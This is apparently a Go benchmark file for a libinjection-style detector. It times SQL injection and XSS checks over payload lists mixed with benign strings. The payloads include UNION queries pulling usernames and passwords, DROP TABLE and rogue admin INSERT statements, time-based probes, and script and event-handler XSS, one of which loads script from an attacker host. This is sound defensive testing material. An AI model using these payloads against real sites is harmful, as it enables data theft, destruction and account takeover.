package libinjection

import (
	"testing"
)

var sqliPayloads = []string{

	`1 UNION SELECT username, password FROM users--`,
	`1 UNION ALL SELECT NULL,NULL,NULL--`,
	`' UNION SELECT table_name,2 FROM information_schema.tables--`,

	`1' AND 1=1--`,
	`1' AND 1=2--`,
	`1 AND 'x'='x`,

	`1'; DROP TABLE users--`,
	`1'; INSERT INTO admins VALUES('hacker','pw')--`,

	`1/**/UNION/**/SELECT/**/1,2,3--`,
	`1/*!UNION*//*!SELECT*/1,2--`,

	`1' AND SLEEP(5)--`,
	`1'; WAITFOR DELAY '0:0:5'--`,
	`1'; SELECT pg_sleep(5)--`,

	`1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--`,
	`1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,

	`" OR "1"="1`,
	`' OR '1'='1`,
	`admin'--`,

	`1 ORDER BY 1--`,
	`1 ORDER BY 100--`,

	`1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,

	`hello world`,
	`SELECT * FROM products WHERE id = 42`,
	`user@example.com`,
	`2024-01-15`,
	`{"id": 1, "name": "test product"}`,
	`page=1&sort=name&order=asc`,
	`123e4567-e89b-12d3-a456-426614174000`,
	`The quick brown fox jumps over the lazy dog near the riverbank at sunset`,
	`+1 (555) 867-5309`,
	`#ff0000`,
}

var xssPayloads = []string{

	`<script>alert(1)</script>`,
	`<SCRIPT SRC=http://attacker.example/xss.js></SCRIPT>`,

	`<img src=x onerror=alert(1)>`,
	`<div onmouseover=alert(1)>hover</div>`,
	`<input onfocus=alert(1) autofocus>`,
	`<body onload=alert(1)>`,
	`<svg onload=alert(1)>`,

	`<a href="javascript:alert(1)">click</a>`,
	`<a href=javascript:alert(1)>`,

	`onerror=alert(1)`,
	`onload=alert(1)`,

	`<script>alert&#40;1&#41;</script>`,
	`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>`,

	`<iframe src="javascript:alert(1)">`,
	`<object data="javascript:alert(1)">`,

	`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,

	`<div style="background:url(javascript:alert(1))">`,

	`<svg><script>alert(1)</script></svg>`,

	`<img src="data:text/html,<script>alert(1)</script>">`,

	`<p>Hello world</p>`,
	`<div class="container"><h1>Title</h1></div>`,
	`normal text without any html`,
	`john.doe@example.com`,
	`{"message": "Hello World", "status": "ok"}`,
	`**bold** and _italic_ text`,
	`user+tag@example.co.uk`,
	`https://example.com/path?q=search&page=1`,
	`The quick brown fox jumps over the lazy dog`,
}

func BenchmarkIsSQLi_Payloads(b *testing.B) {
	b.ReportAllocs()
	for b.Loop() {
		for _, input := range sqliPayloads {
			IsSQLi(input)
		}
	}
}

func BenchmarkIsXSS_Payloads(b *testing.B) {
	b.ReportAllocs()
	for b.Loop() {
		for _, input := range xssPayloads {
			IsXSS(input)
		}
	}
}

func BenchmarkIsSQLi(b *testing.B) {
	cases := []struct {
		name  string
		input string
	}{
		{"clean_short", `hello world`},
		{"clean_long", `The quick brown fox jumps over the lazy dog near the riverbank at sunset`},
		{"clean_email", `user@example.com`},
		{"union", `1 UNION SELECT username, password FROM users--`},
		{"boolean", `1' AND 1=1--`},
		{"stacked", `1'; DROP TABLE users--`},
		{"comment_evasion", `1/**/UNION/**/SELECT/**/1,2,3--`},
		{"time_based", `1' AND SLEEP(5)--`},
		{"error_based", `1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--`},
		{"order_by", `1 ORDER BY 1--`},
	}

	for _, tc := range cases {
		b.Run(tc.name, func(b *testing.B) {
			b.ReportAllocs()
			for b.Loop() {
				IsSQLi(tc.input)
			}
		})
	}
}

func BenchmarkIsXSS(b *testing.B) {
	cases := []struct {
		name  string
		input string
	}{

		{"clean_text", `normal text without any html`},
		{"clean_email", `john.doe@example.com`},
		{"clean_html", `<p>Hello world</p>`},

		{"no_angle_attack", `onerror=alert(1)`},
		{"no_angle_clean", `myvar=onfoobar==`},

		{"script_tag", `<script>alert(1)</script>`},
		{"event_handler", `<img src=x onerror=alert(1)>`},
		{"svg", `<svg onload=alert(1)>`},
		{"js_href", `<a href="javascript:alert(1)">click</a>`},
		{"encoded", `<script>alert&#40;1&#41;</script>`},
		{"data_uri", `<img src="data:text/html,<script>alert(1)</script>">`},
		{"style_attr", `<div style="background:url(javascript:alert(1))">`},
	}

	for _, tc := range cases {
		b.Run(tc.name, func(b *testing.B) {
			b.ReportAllocs()
			for b.Loop() {
				IsXSS(tc.input)
			}
		})
	}
}
